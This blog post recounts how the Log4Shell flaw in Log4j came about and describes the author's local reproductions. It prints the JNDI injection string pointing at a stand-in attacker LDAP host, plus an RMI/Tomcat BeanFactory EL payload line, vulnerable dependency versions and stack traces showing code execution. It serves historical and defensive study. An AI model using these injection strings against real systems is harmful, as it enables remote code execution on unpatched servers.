# Log4Shell exploit story
*November 13, 2026*


>In December 2021, the Log4Shell ([CVE-2021-44228](https://nvd.nist.gov/vuln/detail/cve-2021-44228)) exploit made headlines across the industry. This is the story of how it became possible.

Back in 1999, 64 MB of RAM was considered normal for a server (not 64 GB), and running each Java web application in a separate JVM was far too expensive. To address this, the Java Servlet 2.2 specification introduced the WAR file format - a ZIP archive defining a web application. Apache Tomcat 3.0 then supported deploying multiple WAR files within a single JVM. JNDI lookups with the `java:comp/env` prefix were described later, in 2001, in the Java Servlet 2.3 specification.

In 2007, Logback added a new feature: configuring logging according to JNDI lookups using constant names
 `JNDI_CONFIGURATION_RESOURCE = "java:comp/env/logback/configuration-resource"` and `JNDI_CONTEXT_NAME = "java:comp/env/logback/context-name"`. This [implementation](https://github.com/qos-ch/logback/commit/ae37a91bcc26a0366b20d30c00b97ea183bbd692) had no security issues.

However, in 2013, Log4j created [LOG4J2-313](https://issues.apache.org/jira/browse/LOG4J2-313) for feature parity. The intended use was strictly for configuration files, such as `<Routes pattern="$${jndi:logging/context-name}">`. Because there were already numerous string substitutors, adding one more did not seem dangerous. The java:comp/env prefix was added like that:

```java
    private String convertJndiName(String jndiName) {
        if (!jndiName.startsWith(CONTAINER_JNDI_RESOURCE_PATH_PREFIX) && jndiName.indexOf(':') == -1) {
            jndiName = CONTAINER_JNDI_RESOURCE_PATH_PREFIX + jndiName;
        }

        return jndiName;
    }
```    

where

```java 
static final String CONTAINER_JNDI_RESOURCE_PATH_PREFIX = "java:comp/env/";
```

This approach is understandable: accept everything to give administrators maximum flexibility. If the prefix is already present, it is left alone. If a colon is present, it is also untouched on the assumption that the administrator knows better.

The problem was that `org.apache.logging.log4j.core.lookup.Interpolator` was used not only for configuration files, but also for ordinary log messages, where developers might log arbitrary user input. If a user entered `${jndi:key}`,  the value of `java:comp/env/key` would be logged (if configured). `${env:PASSWORD}` similarly functioned across many Log4j versions, presenting another security risk.

By 2021 — at a time when deploying multiple distinct web applications on the same JVM was no longer common practice — attackers discovered that strings like `${jndi:ldap://badCriminal.com:1389/a}` bypassed prefix addition because they contained a colon. This caused the `javax.naming.InitialContext.lookup()` method to be invoked with `ldap://badCriminal.com:1389/a` as a parameter. Nothing in the Javadoc indicated that this method could initialize a class downloaded from the internet, and passing user input directly into it opened the door to Remote Code Execution (RCE).

Searching for **JNDI Injection**, I found [detailed slides](https://blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf) from Black Hat USA 2016 conference. Using Java 8u66 installed on my desktop in 2015 alongside a [project published in 2017](https://github.com/mbechler/marshalsec) for the attack component, I did an exploit that prints a stack trace: 

```
java.lang.Exception
	at Exploit.<clinit>(Exploit.java:4)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:348)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:72)
	at com.sun.naming.internal.VersionHelper12.loadClass(VersionHelper12.java:87)
	at javax.naming.spi.NamingManager.getObjectFactoryFromReference(NamingManager.java:158)
	at javax.naming.spi.DirectoryManager.getObjectInstance(DirectoryManager.java:189)
	at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1085)
	at com.sun.jndi.toolkit.ctx.ComponentContext.p_lookup(ComponentContext.java:542)
	at com.sun.jndi.toolkit.ctx.PartialCompositeContext.lookup(PartialCompositeContext.java:177)
	at com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:205)
	at com.sun.jndi.url.ldap.ldapURLContext.lookup(ldapURLContext.java:94)
	at javax.naming.InitialContext.lookup(InitialContext.java:417)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
	...
```

As shown here, the vulnerability relies heavily on deep Java internals. The landmine was placed long ago by Sun Microsystems in [RFC 2713](https://www.rfc-editor.org/info/rfc2713/) — it remains a curious design choice to allow bytecode to be downloaded from an LDAP server and executed automatically.

Until the release of [Java 8u191 in 2018](https://mbechler.github.io/2018/11/01/Java-CVE-2018-3149/) Log4Shell exploit was available even for kids. However, as the [Veracode team explained in 2019](https://www.veracode.com/blog/research/exploiting-jndi-injections-java), patching that single vector was not a complete solution.

To reproduce the exploit I added dependency `implementation("org.apache.tomcat:tomcat-catalina:8.0.1")` for attacker RMI server, which provides `org.apache.naming.ResourceRef`.

For the target application I added dependencies
```
    implementation("org.apache.tomcat:tomcat-catalina:8.5.20")
    implementation("org.apache.tomcat:tomcat-jasper-el:8.5.20")
```

For the RCE, I created `ClassThatPrintsExceptionInConstructor` and updated the attacker payload: 

```java
	ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"ClassThatPrintsExceptionInConstructor\").newInstance()"));
```

After this changes 

```java
	logger.error("${jndi:rmi://127.0.0.1:1097/Object}");
```

generates the following stack trace on Java 11:

```
java.lang.Exception
	at ClassThatPrintsExceptionInConstructor.<init>(ClassThatPrintsExceptionInConstructor.java:4)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method)
	at java.base/jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45)
	at java.base/java.lang.reflect.Constructor.newInstance(Constructor.java:490)
	at java.base/java.lang.Class.newInstance(Class.java:584)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at javax.el.BeanELResolver.invoke(BeanELResolver.java:158)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:79)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:159)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:184)
	at javax.el.ELProcessor.getValue(ELProcessor.java:61)
	at javax.el.ELProcessor.eval(ELProcessor.java:54)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at java.base/jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at java.base/jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.base/java.lang.reflect.Method.invoke(Method.java:566)
	at org.apache.naming.factory.BeanFactory.getObjectInstance(BeanFactory.java:211)
	at java.naming/javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:341)
	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.decodeObject(RegistryContext.java:499)
	at jdk.naming.rmi/com.sun.jndi.rmi.registry.RegistryContext.lookup(RegistryContext.java:139)
	at java.naming/com.sun.jndi.toolkit.url.GenericURLContext.lookup(GenericURLContext.java:220)
	at java.naming/javax.naming.InitialContext.lookup(InitialContext.java:409)
	at org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)
```
This behavior also occurs on Java 8, though I was unable to reproduce it on Java 17 (which does not inherently guarantee that Java 17 is safe). 

Maybe this exploit is too complex for kids, but Java 11 and Tomcat 8 were widespread in 2021.

Remote code downloading in JNDI is permanently disabled starting with [Java 24](https://bugs.openjdk.org/browse/JDK-8338536).

Why am I writing this article in 2026? As I search for opportunities in Israel’s rapidly growing cybersecurity sector, I conducted this research to sharpen my skills. And now it is clear why this industry is growing: against AI-driven attackers we need a much better defense.

